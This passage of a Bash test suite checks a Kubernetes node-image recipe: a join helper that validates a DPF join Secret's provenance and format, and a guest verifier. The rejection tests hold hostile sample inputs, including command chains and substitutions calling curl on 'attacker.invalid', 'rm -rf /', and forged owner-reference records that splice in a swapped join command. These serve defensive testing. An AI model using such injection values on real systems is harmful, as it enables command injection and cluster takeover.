	rm -f "${dir}/boot/config-from-proc"
	KERNEL_CONFIG_PROC="${dir}/proc-config.gz" \
		KERNEL_CONFIG_FILE="${dir}/boot/config-from-proc" \
		ensure_kernel_config
	[ ! -e "${dir}/boot/config-from-proc" ] \
		|| fail "ensure_kernel_config wrote a config when /proc/config.gz exists"
	echo "PASS: kernel config for kubeadm"
)

test_join_helper_configures_kubelet_from_the_secret() {
	local root
	root="$(join_helper_env valid)"
	: > "${root}/calls"

	run_join_helper "${root}" "FAKE_JOIN_COMMAND=${VALID_JOIN_COMMAND}" \
		|| {
			cat "${root}/out" >&2
			fail "the join helper rejected a valid join Secret"
		}

	assert_contains 'kubeadm-arg join' "${root}/calls"
	assert_contains 'kubeadm-arg 10.1.2.3:6443' "${root}/calls"
	assert_contains 'kubeadm-arg --token' "${root}/calls"
	assert_contains 'kubeadm-arg abcdef.0123456789abcdef' "${root}/calls"
	assert_contains 'kubeadm-arg sha256:0000000000000000000000000000000000000000000000000000000000000000' \
		"${root}/calls"
	# The tenant Node has to be named after the DPU; DPF's command does not say so.
	assert_contains 'kubeadm-arg --node-name=e2e-fleet-host-0000-e2e-fleet-device-000000' \
		"${root}/calls"
	assert_contains "get secret ${JOIN_DPU_NAME}-kubeadm-join" "${root}/calls"
	# Provenance is checked against the real DPU before the join is used.
	assert_contains "get dpu ${JOIN_DPU_NAME}" "${root}/calls"
	assert_contains 'ownerReferences' "${root}/calls"
	# One Secret read, so the bytes that were vouched for are the bytes that
	# get executed. A second GET could be answered by a Secret that was
	# replaced in between.
	assert_secret_read_once "${root}/calls"
	# Starting kubelet is the mock's step, not this one's.
	assert_absent 'systemctl' "${root}/calls"
	# The bootstrap token must not reach the console or the journal.
	assert_absent 'abcdef.0123456789abcdef' "${root}/out"
}

# The join Secret sits at a name anything with namespace write access can
# claim. The controller no longer reads it, so the guest is the only thing
# left that can tell DPF's Secret from an impostor: it compares the Secret's
# DPU owner reference against the DPU it is actually going to become.
test_join_helper_requires_dpf_provenance() {
	local entry case_name response
	local secret_line="secret=${JOIN_DPU_NAME}-kubeadm-join"
	# Every mismatch the API server could find (wrong UID, wrong name, wrong
	# kind, wrong API group, no owner at all) reaches the guest the same way:
	# the verdict token is simply absent. What the server was asked to compare
	# is pinned separately by
	# test_join_helper_asks_the_api_to_compare_every_owner_field.
	local -a rejected=(
		"no-matching-owner:${secret_line}"
		"verdict-token-misspelled:${secret_line}
dpu-owner-matched"
		"verdict-token-embedded-in-another-record:${secret_line}
secret=dpu-owner-match"
	)
	for entry in "${rejected[@]}"; do
		case_name="${entry%%:*}"
		response="${entry#*:}"
		local root
		root="$(join_helper_env "provenance-${case_name}")"
		: > "${root}/calls"

		if run_join_helper "${root}" "FAKE_JOIN_COMMAND=${VALID_JOIN_COMMAND}" \
			"FAKE_SECRET_RESPONSE=${response}"; then
			fail "the join helper accepted a join Secret with ${case_name}"
		fi
		assert_contains 'not owned by' "${root}/out"
		# The verdict and the payload arrive in one response, so an impostor's
		# bytes are read; what matters is that they are discarded without ever
		# being decoded, executed, or logged.
		assert_absent 'kubeadm-arg' "${root}/calls"
		assert_absent "${JOIN_DPU_UID}" "${root}/out"
		assert_absent 'abcdef.0123456789abcdef' "${root}/out"
		assert_secret_read_once "${root}/calls"
	done

	# A Secret the DPU owns alongside other owners is still DPF's: the server
	# emits the verdict for the reference that matched and says nothing about
	# the rest.
	local root
	root="$(join_helper_env provenance-extra-owner)"
	: > "${root}/calls"
	run_join_helper "${root}" "FAKE_JOIN_COMMAND=${VALID_JOIN_COMMAND}" \
		"FAKE_SECRET_RESPONSE=${secret_line}
${JOIN_SECRET_OWNER_MATCH}" \
		|| {
			cat "${root}/out" >&2
			fail "the join helper rejected a genuine Secret with extra owners"
		}
	assert_contains 'kubeadm-arg join' "${root}/calls"
}

# Provenance is only worth anything if the bytes it vouched for are the bytes
# that run. Reading the Secret twice would leave a window in which it is
# replaced in between, so the owner references and the payload have to come
# out of one response. This proves it by answering every read after the first
# with a different join command: a helper that re-reads would execute the
# swapped one.
test_join_helper_uses_a_single_secret_response() {
	local root
	root="$(join_helper_env single-read)"
	: > "${root}/calls"
	local swapped="kubeadm join 10.9.9.9:6443 --token 999999.9999999999999999 --discovery-token-ca-cert-hash sha256:1111111111111111111111111111111111111111111111111111111111111111"

	run_join_helper "${root}" "FAKE_JOIN_COMMAND=${VALID_JOIN_COMMAND}" \
		"FAKE_SWAPPED_JOIN_COMMAND=${swapped}" \
		|| {
			cat "${root}/out" >&2
			fail "the join helper failed on a single-response Secret"
		}

	assert_secret_read_once "${root}/calls"
	assert_contains 'kubeadm-arg 10.1.2.3:6443' "${root}/calls"
	# The swapped command must never have been seen, let alone executed.
	assert_absent '10.9.9.9:6443' "${root}/calls"
	assert_absent '999999.9999999999999999' "${root}/calls"
	assert_absent '999999.9999999999999999' "${root}/out"
}

# Owner reference fields are attacker-controlled strings that Kubernetes does
# not stop from carrying a newline, so anything the helper reads back as
# separate records can have extra records spliced into it. Both halves of the
# response have to survive that: the payload record and the ownership verdict.
test_join_helper_survives_owner_reference_injection() {
	local secret_line="secret=${JOIN_DPU_NAME}-kubeadm-join"
	local hostile="kubeadm join 10.9.9.9:6443 --token 999999.9999999999999999 --discovery-token-ca-cert-hash sha256:1111111111111111111111111111111111111111111111111111111111111111"
	local hostile_payload
	hostile_payload="$(printf '%s' "${hostile}" | base64 | tr -d '\n')"

	# An owner field whose value splices in a join= record ahead of the real
	# one. Parsing that took the first join= record would run the attacker's
	# command with the real Secret's approval.
	local root
	root="$(join_helper_env injected-payload-record)"
	: > "${root}/calls"
	run_join_helper "${root}" "FAKE_JOIN_COMMAND=${VALID_JOIN_COMMAND}" \
		"FAKE_SECRET_RESPONSE=${secret_line}
join=${hostile_payload}
${JOIN_SECRET_OWNER_MATCH}" \
		|| {
			cat "${root}/out" >&2
			fail "the join helper rejected a Secret with a spliced payload record"
		}

	assert_contains 'kubeadm-arg 10.1.2.3:6443' "${root}/calls"
	assert_absent '10.9.9.9:6443' "${root}/calls"
	assert_absent '999999.9999999999999999' "${root}/calls"
	assert_secret_read_once "${root}/calls"

	# An owner field whose value splices in the text an older, line-matching
	# provenance check looked for. The verdict now comes from the API server
	# comparing the real field values, so forged text cannot produce it.
	root="$(join_helper_env injected-owner-verdict)"
	: > "${root}/calls"
	if run_join_helper "${root}" "FAKE_JOIN_COMMAND=${VALID_JOIN_COMMAND}" \
		"FAKE_SECRET_RESPONSE=${secret_line}
owner=provisioning.dpu.nvidia.com/v1alpha1|DPU|${JOIN_DPU_NAME}|${JOIN_DPU_UID}"; then
		fail "the join helper accepted a forged owner-reference line"
	fi
	assert_contains 'not owned by' "${root}/out"
	assert_absent 'kubeadm-arg' "${root}/calls"

	# The same splice, this time trying to forge the verdict token itself
	# inside an owner field. It can only appear when the API server emitted it.
	root="$(join_helper_env injected-owner-token)"
	: > "${root}/calls"
	if run_join_helper "${root}" "FAKE_JOIN_COMMAND=${VALID_JOIN_COMMAND}" \
		"FAKE_SECRET_RESPONSE=${secret_line}
join=${hostile_payload}"; then
		fail "the join helper joined without an ownership verdict from the API"
	fi
	assert_contains 'not owned by' "${root}/out"
	assert_absent 'kubeadm-arg' "${root}/calls"
}

# The ownership verdict is decided by the API server against the real field
# values, so the helper must ask it to compare all four of them.
test_join_helper_asks_the_api_to_compare_every_owner_field() {
	local root
	root="$(join_helper_env owner-template)"
	: > "${root}/calls"
	run_join_helper "${root}" "FAKE_JOIN_COMMAND=${VALID_JOIN_COMMAND}" > /dev/null \
		|| {
			cat "${root}/out" >&2
			fail "the join helper rejected a valid join Secret"
		}

	local request
	request="$(grep -m1 'get secret ' "${root}/calls")"
	for fragment in \
		'go-template' \
		'.apiVersion "provisioning.dpu.nvidia.com/v1alpha1"' \
		'.kind "DPU"' \
		".name \"${JOIN_DPU_NAME}\"" \
		".uid \"${JOIN_DPU_UID}\""; do
		if ! grep -Fq -- "${fragment}" <<< "${request}"; then
			fail "the Secret request does not have the API compare ${fragment}"
		fi
	done
}

# Without the DPU there is nothing to check provenance against, so the helper
# waits rather than trusting whatever sits at the Secret's name.
test_join_helper_waits_for_the_dpu_before_reading_the_secret() {
	local root
	root="$(join_helper_env no-dpu)"
	: > "${root}/calls"

	if run_join_helper "${root}" "FAKE_JOIN_COMMAND=${VALID_JOIN_COMMAND}" FAKE_DPU_UID=; then
		fail "the join helper joined without confirming the DPU exists"
	fi
	assert_contains 'did not appear' "${root}/out"
	assert_absent 'kubeadm-arg' "${root}/calls"
	# Without a DPU to check against, the Secret is never read at all.
	assert_absent 'get secret ' "${root}/calls"
}

# On a real DPU the agent's Configure Kubelet step joins the tenant cluster,
# inside DPU Cluster Config. Joining as soon as the Secret exists registers the
# Node before OS Installing has even finished, which makes every phase delay
# up to DPU Cluster Config invisible to the DPF controller.
test_join_helper_waits_for_configure_kubelet() {
	local root
	root="$(join_helper_env configure-kubelet-gate)"
	: > "${root}/calls"

	# Waiting for DPF to reach the step is not a failed attempt: two attempts
	# would not survive four gated reads if it were.
	run_join_helper "${root}" "FAKE_JOIN_COMMAND=${VALID_JOIN_COMMAND}" \
		"FAKE_DPU_STATES=OS Installing|
OS Installing|
DPU Cluster Config|False
DPU Cluster Config|True" \
		|| {
			cat "${root}/out" >&2
			fail "the join helper did not join once the agent configured kubelet"
		}

	local dpu_reads
	dpu_reads="$(grep -c 'get dpu ' "${root}/calls" || true)"
	test "${dpu_reads}" = "4" \
		|| fail "the join helper read the DPU ${dpu_reads} times; expected 4"
	assert_secret_read_once "${root}/calls"
	assert_contains 'kubeadm-arg join' "${root}/calls"
	# A gate that can stay closed for half an hour logs on change, not per poll.
	local waits
	waits="$(grep -c 'phase OS Installing' "${root}/out" || true)"
	test "${waits}" = "1" \
		|| fail "the join helper logged the same wait ${waits} times; expected once"
	assert_contains 'phase DPU Cluster Config' "${root}/out"
	assert_absent 'attempt ' "${root}/out"
}

# The agent resets its conditions in memory at the start of a run and only
# pushes them with its first status update, so a KubeletConfigured=True from
# an earlier run can sit on the DPU through a long OS Installing delay. The
# phase is what the controller moves, and it cannot be DPU Cluster Config
# until this run's DPU Config is over.
test_join_helper_ignores_kubelet_configured_outside_its_phase() {
	local phase root
	for phase in "OS Installing" "Rebooting" "DPU Config" "Service Readiness"; do
		root="$(join_helper_env "stale-${phase// /-}")"
		: > "${root}/calls"

		# The DPU then disappears, which is the only way to end a wait that
		# would otherwise last as long as the guest.
		if run_join_helper "${root}" "FAKE_JOIN_COMMAND=${VALID_JOIN_COMMAND}" \
			"FAKE_DPU_STATES=${phase}|True
absent"; then
			fail "the join helper joined on KubeletConfigured=True during ${phase}"
		fi
		assert_absent 'get secret ' "${root}/calls"
		assert_absent 'kubeadm-arg' "${root}/calls"
	done
}

# Phase, condition and UID come from one read, so the gate and the provenance
# check describe the same DPU object.
test_join_helper_reads_its_gate_with_the_dpu_uid() {
	local root
	root="$(join_helper_env gate-request)"
	: > "${root}/calls"
	run_join_helper "${root}" "FAKE_JOIN_COMMAND=${VALID_JOIN_COMMAND}" > /dev/null \
		|| {
			cat "${root}/out" >&2
			fail "the join helper rejected a valid join Secret"
		}

	local request
	request="$(grep -m1 'get dpu ' "${root}/calls")"
	for fragment in '{.metadata.uid}' '{.status.phase}' \
		'{.status.agentStatus.conditions[?(@.type=="KubeletConfigured")].status}'; do
		grep -Fq -- "${fragment}" <<< "${request}" \
			|| fail "the DPU request does not read ${fragment}"
	done
}

test_join_helper_is_idempotent_once_kubelet_is_configured() {
	local root
	root="$(join_helper_env already-joined)"
	: > "${root}/calls"
	printf 'apiVersion: v1\nkind: Config\n' > "${root}/etc/kubelet.conf"

	run_join_helper "${root}" "FAKE_JOIN_COMMAND=${VALID_JOIN_COMMAND}" \
		|| {
			cat "${root}/out" >&2
			fail "the join helper failed on an already joined guest"
		}

	test ! -s "${root}/calls" \
		|| fail "the join helper rejoined a guest that already has kubelet.conf"
}

test_join_helper_retries_until_the_secret_exists() {
	local root
	root="$(join_helper_env missing-secret)"
	: > "${root}/calls"

	# The DPU exists, DPF has not published its join Secret yet.
	if run_join_helper "${root}" FAKE_SECRET_RESPONSE=; then
		fail "the join helper reported success without a join Secret"
	fi
	assert_contains 'did not appear' "${root}/out"
	assert_absent 'kubeadm-arg' "${root}/calls"
	# Two attempts were configured, so systemd's restart is what keeps trying.
	assert_matches 'attempt 2/2' "${root}/out"
	# A missing Secret is not the same as DPF lag. The last kubectl stderr has
	# to reach the journal or a 403 and an expired token look identical to
	# "not both published yet" for as long as the guest is up.
	assert_contains 'last kubectl error:' "${root}/out"
	assert_contains 'secrets not found' "${root}/out"
}

# The join Secret sits at a name anything with namespace write access can
# claim, and its value is a shell command in DPF's format. The helper must
# treat it as untrusted input rather than execute it.
test_join_helper_refuses_anything_but_a_kubeadm_join() {
	local case_name command
	local -a rejected=(
		"shell-chain:kubeadm join 10.1.2.3:6443 --token abcdef.0123456789abcdef --discovery-token-ca-cert-hash sha256:0000000000000000000000000000000000000000000000000000000000000000; curl http://attacker.invalid"
		"command-substitution:kubeadm join \$(curl http://attacker.invalid):6443 --token abcdef.0123456789abcdef --discovery-token-ca-cert-hash sha256:0000000000000000000000000000000000000000000000000000000000000000"
		"second-line:kubeadm join 10.1.2.3:6443 --token abcdef.0123456789abcdef --discovery-token-ca-cert-hash sha256:0000000000000000000000000000000000000000000000000000000000000000
curl http://attacker.invalid"
		"not-kubeadm:rm -rf / --token abcdef.0123456789abcdef"
		"unknown-flag:kubeadm join 10.1.2.3:6443 --token abcdef.0123456789abcdef --discovery-token-ca-cert-hash sha256:0000000000000000000000000000000000000000000000000000000000000000 --config=/tmp/evil.yaml"
		"no-ca-hash:kubeadm join 10.1.2.3:6443 --token abcdef.0123456789abcdef --v=5"
		"malformed-hash:kubeadm join 10.1.2.3:6443 --token abcdef.0123456789abcdef --discovery-token-ca-cert-hash sha256:short"
	)
	local entry
	for entry in "${rejected[@]}"; do
		case_name="${entry%%:*}"
		command="${entry#*:}"
		local root
		root="$(join_helper_env "reject-${case_name}")"
		: > "${root}/calls"

		if run_join_helper "${root}" "FAKE_JOIN_COMMAND=${command}"; then
			fail "the join helper accepted a ${case_name} join Secret"
		fi
		assert_contains 'does not hold the expected kubeadm join command' "${root}/out"
		assert_absent 'kubeadm-arg' "${root}/calls"
		assert_absent 'curl' "${root}/calls"
		# Rejecting must not echo the value: it can still carry a real token.
		assert_absent 'abcdef.0123456789abcdef' "${root}/out"
	done
}

test_join_helper_requires_its_cloud_init_inputs() {
	local root
	root="$(join_helper_env no-kubeconfig)"
	: > "${root}/calls"
	rm -f "${root}/etc/mgmt.kubeconfig"

	if run_join_helper "${root}" "FAKE_JOIN_COMMAND=${VALID_JOIN_COMMAND}"; then
		fail "the join helper ran without a management kubeconfig"
	fi
	assert_contains 'management kubeconfig' "${root}/out"
	assert_absent 'kubectl' "${root}/calls"

	root="$(join_helper_env bad-identity)"
	: > "${root}/calls"
	printf 'DPU_NAME=../../escape\nDPU_NAMESPACE=dpf-operator-system\n' \
		> "${root}/etc/identity.env"
	if run_join_helper "${root}" "FAKE_JOIN_COMMAND=${VALID_JOIN_COMMAND}"; then
		fail "the join helper accepted an unusable DPU identity"
	fi
	assert_contains 'usable DPU name' "${root}/out"
	assert_absent 'kubectl' "${root}/calls"
}

run_verifier() {
	local out="$1"
	shift
	write_guestfish "${TMP}/verify-bin/guestfish"
	if (
		env PATH="${TMP}/verify-bin:${PATH}" "$@" \
			"${ROOT}/verify-guest.sh" "${TMP}/disk.img"
	) > "${out}" 2>&1; then
		return 0
	fi
	return 1
}

test_verifier_accepts_a_healthy_guest() {
	run_verifier "${TMP}/verify-ok.out" \
		|| {
			cat "${TMP}/verify-ok.out" >&2
			fail "verify-guest.sh rejected a healthy guest"
		}
	assert_contains 'guest verification passed' "${TMP}/verify-ok.out"
}

test_verifier_rejects_missing_guest_file() {
	local file
	for file in /usr/bin/kubelet /opt/cni/bin/host-local \
		/etc/cni/net.d/10-flannel.conflist /etc/containerd/config.toml \
		/etc/modules-load.d/simfleet.conf /etc/sysctl.d/99-simfleet-k8s.conf \
		/usr/lib/systemd/system/qemu-guest-agent.service \
		/usr/lib/udev/rules.d/60-qemu-guest-agent.rules \
		/opt/dpf/mock-dpuagent /opt/dpf/wait-kubelet-join.sh \
		/usr/lib/systemd/system/mock-dpuagent.service \
		/usr/lib/systemd/system/wait-kubelet-join.service; do
		if run_verifier "${TMP}/verify-missing.out" "FAKE_MISSING_FILE=${file}"; then
			fail "verify-guest.sh accepted a guest without ${file}"
		fi
		assert_contains 'guest verification failed' "${TMP}/verify-missing.out"
	done
}

test_verifier_rejects_missing_guest_agent_binary() {
	if run_verifier "${TMP}/verify-agent.out" \
		FAKE_QEMU_GA_SBIN=false FAKE_QEMU_GA_BIN=false; then
		fail "verify-guest.sh accepted a guest without qemu-ga"
	fi
	assert_contains 'qemu-guest-agent binary is missing' "${TMP}/verify-agent.out"
}

test_verifier_rejects_incorrect_systemd_state() {
	if run_verifier "${TMP}/verify-kubelet.out" FAKE_KUBELET_ENABLED=true; then
		fail "verify-guest.sh accepted enabled kubelet"
	fi
	assert_contains 'kubelet is enabled; expected disabled' "${TMP}/verify-kubelet.out"

	if run_verifier "${TMP}/verify-containerd.out" FAKE_CONTAINERD_ENABLED=false; then
		fail "verify-guest.sh accepted disabled containerd"
	fi
	assert_contains 'containerd.service is disabled; expected enabled' "${TMP}/verify-containerd.out"

	# Guests ship with the agent enabled. Disabling it is cloud-init's job for a
	# fleet that asked for no agent, not the image's.
	if run_verifier "${TMP}/verify-dpuagent.out" FAKE_DPUAGENT_ENABLED=false; then
		fail "verify-guest.sh accepted disabled mock-dpuagent"
	fi
	assert_contains 'mock-dpuagent.service is disabled; expected enabled' "${TMP}/verify-dpuagent.out"

	# The agent is ordered after cloud-final.service, which starts only once
	# multi-user.target has been reached. Enabled there, its start job waits on a
	# service outside its own transaction and the agent never runs.
	if run_verifier "${TMP}/verify-dpuagent-target.out" FAKE_DPUAGENT_ON_MULTI_USER=true; then
		fail "verify-guest.sh accepted mock-dpuagent enabled under multi-user.target"
	fi
	assert_contains 'reached before cloud-final' "${TMP}/verify-dpuagent-target.out"

	# The join helper is enabled the same way and for the same reason: its
	# credential arrives from cloud-init.
	if run_verifier "${TMP}/verify-join-helper.out" FAKE_JOIN_HELPER_ENABLED=false; then
		fail "verify-guest.sh accepted a disabled wait-kubelet-join"
	fi
	assert_contains 'wait-kubelet-join.service is disabled; expected enabled' \
		"${TMP}/verify-join-helper.out"
	if run_verifier "${TMP}/verify-join-helper-target.out" FAKE_JOIN_HELPER_ON_MULTI_USER=true; then
		fail "verify-guest.sh accepted wait-kubelet-join enabled under multi-user.target"
	fi
	assert_contains 'reached before cloud-final' "${TMP}/verify-join-helper-target.out"

	if run_verifier "${TMP}/verify-agent-unit.out" \
		'FAKE_AGENT_RULE=SUBSYSTEM=="virtio-ports"'; then
		fail "verify-guest.sh accepted an incomplete guest-agent udev rule"
	fi
	assert_contains 'qemu-guest-agent udev rule lacks' "${TMP}/verify-agent-unit.out"
}

test_verifier_fails_closed_on_guestfish_errors() {
	local request
	for request in \
		'is-symlink /etc/systemd/system/multi-user.target.wants/kubelet.service' \
		'is-symlink /etc/systemd/system/multi-user.target.wants/containerd.service' \
		'cat /etc/containerd/config.toml' \
		'cat /var/lib/dpkg/status' \
		'is-symlink /etc/systemd/system/cloud-init.target.wants/mock-dpuagent.service' \
		'is-symlink /etc/systemd/system/cloud-init.target.wants/wait-kubelet-join.service' \
		'statvfs /'; do
		if run_verifier "${TMP}/verify-error.out" "FAKE_GUESTFISH_FAIL_ON=${request}"; then
			fail "verify-guest.sh passed while guestfish failed on '${request}'"
		fi
	done
	# The kubelet check in particular used to treat a guestfish failure as
	# "not enabled", which passed.
	if run_verifier "${TMP}/verify-error-kubelet.out" \
		'FAKE_GUESTFISH_FAIL_ON=is-symlink /etc/systemd/system/multi-user.target.wants/kubelet.service'; then
		fail "verify-guest.sh passed while the kubelet check failed"
	fi
	assert_contains 'could not check whether kubelet.service is enabled' \
		"${TMP}/verify-error-kubelet.out"
}

test_verifier_rejects_bad_containerd_config() {
	if run_verifier "${TMP}/verify-cgroupfs.out" \
		'FAKE_CONTAINERD_CONFIG=      SystemdCgroup = false'; then
		fail "verify-guest.sh accepted the cgroupfs driver"
	fi
	assert_contains 'systemd cgroup driver' "${TMP}/verify-cgroupfs.out"

	if run_verifier "${TMP}/verify-cri.out" \
		'FAKE_CONTAINERD_CONFIG=disabled_plugins = ["cri"]
      SystemdCgroup = true'; then
		fail "verify-guest.sh accepted a disabled CRI plugin"
	fi
	assert_contains 'disables the CRI plugin' "${TMP}/verify-cri.out"
}

test_verifier_rejects_missing_kubeadm_prerequisites() {
	if run_verifier "${TMP}/verify-modules.out" 'FAKE_MODULES=overlay'; then
		fail "verify-guest.sh accepted a guest that does not load br_netfilter"
	fi
	assert_contains 'does not load br_netfilter' "${TMP}/verify-modules.out"

	if run_verifier "${TMP}/verify-sysctl.out" \
		'FAKE_SYSCTLS=net.bridge.bridge-nf-call-iptables = 1
net.ipv4.ip_forward = 1'; then
		fail "verify-guest.sh accepted a guest missing a kubeadm sysctl"
	fi
	assert_contains 'net.bridge.bridge-nf-call-ip6tables = 1' "${TMP}/verify-sysctl.out"
}

test_verifier_rejects_wrong_kubernetes_version() {
	if run_verifier "${TMP}/verify-version.out" FAKE_KUBE_DPKG_VERSION=1.29.0-1.1; then
		fail "verify-guest.sh accepted the wrong Kubernetes package version"
	fi
	assert_contains 'expected 1.36.4-1.1' "${TMP}/verify-version.out"
}

test_verifier_rejects_uncleaned_apt_state() {
	if run_verifier "${TMP}/verify-lists.out" \
		'FAKE_APT_LISTS=partial
pkgs.k8s.io_core:_stable:_v1.36_deb_._Packages'; then
		fail "verify-guest.sh accepted stale apt indexes"
	fi
	assert_contains 'apt package indexes were not cleaned' "${TMP}/verify-lists.out"

	if run_verifier "${TMP}/verify-archives.out" \
		'FAKE_APT_ARCHIVES=kubelet_1.36.4-1.1_amd64.deb'; then
		fail "verify-guest.sh accepted downloaded .deb archives"
	fi
	assert_contains 'archives were not cleaned' "${TMP}/verify-archives.out"
}

test_verifier_rejects_undersized_root_filesystem() {
	if run_verifier "${TMP}/verify-size.out" FAKE_ROOT_BLOCKS=500000; then
		fail "verify-guest.sh accepted an undersized root filesystem"
	fi
	assert_contains 'expected at least' "${TMP}/verify-size.out"
}

# install.sh points the guest at the QEMU user-mode resolver so apt works
# during the build. That address is meaningless to a booted guest, so shipping
# it would leave the node unable to resolve anything.
test_verifier_rejects_build_time_resolver() {
	if run_verifier "${TMP}/verify-resolv-left.out" FAKE_RESOLV_BACKUP_LEFT=true; then
		fail "verify-guest.sh accepted a leftover resolv.conf backup"
	fi
	assert_contains 'build-time resolv.conf backup was left' \
		"${TMP}/verify-resolv-left.out"

	if run_verifier "${TMP}/verify-resolv-baked.out" \
		FAKE_RESOLV_IS_LINK=false FAKE_RESOLV='nameserver 169.254.2.3'; then
		fail "verify-guest.sh accepted the build-time nameserver in the guest"
	fi
	assert_contains 'build-time QEMU nameserver' "${TMP}/verify-resolv-baked.out"
}

test_recipe_contract
test_container_image_contract
test_source_hash
test_build_orchestration
test_build_requires_dpuagent_binary
test_build_stamps_release_version
test_build_requires_linux_amd64
test_host_guard_requires_every_tool
test_check_host_script
test_build_rejects_invalid_builder_iid
test_check_host_rejects_empty_builder_iid_and_cleans_up
test_check_host_rejects_unusable_libguestfs
test_customize_reports_libguestfs_diagnostics
test_build_fails_when_root_does_not_grow
test_build_fails_when_resize_renumbers_root
test_growth_threshold_accepts_a_real_build
test_container_cleanup_after_extraction_failure
test_container_cleanup_before_customization_failure
test_cached_build_reuses_matching_source_hash
test_cached_build_rebuilds_on_recipe_change
test_cached_build_rebuilds_on_image_version_change
test_cached_build_never_trusts_a_bare_tag
test_join_args_hook
test_kernel_config_for_kubeadm
test_join_helper_configures_kubelet_from_the_secret
test_join_helper_is_idempotent_once_kubelet_is_configured
test_join_helper_waits_for_configure_kubelet
test_join_helper_ignores_kubelet_configured_outside_its_phase
test_join_helper_reads_its_gate_with_the_dpu_uid
test_join_helper_retries_until_the_secret_exists
test_join_helper_refuses_anything_but_a_kubeadm_join
test_join_helper_requires_dpf_provenance
test_join_helper_asks_the_api_to_compare_every_owner_field
test_join_helper_survives_owner_reference_injection
test_join_helper_uses_a_single_secret_response
test_join_helper_waits_for_the_dpu_before_reading_the_secret
test_join_helper_requires_its_cloud_init_inputs
test_verifier_accepts_a_healthy_guest
test_verifier_rejects_missing_guest_file
test_verifier_rejects_missing_guest_agent_binary
test_verifier_rejects_incorrect_systemd_state
test_verifier_fails_closed_on_guestfish_errors
test_verifier_rejects_bad_containerd_config
test_verifier_rejects_missing_kubeadm_prerequisites
test_verifier_rejects_wrong_kubernetes_version
test_verifier_rejects_uncleaned_apt_state
test_verifier_rejects_undersized_root_filesystem
test_verifier_rejects_build_time_resolver
echo "simfleet-node recipe tests passed"
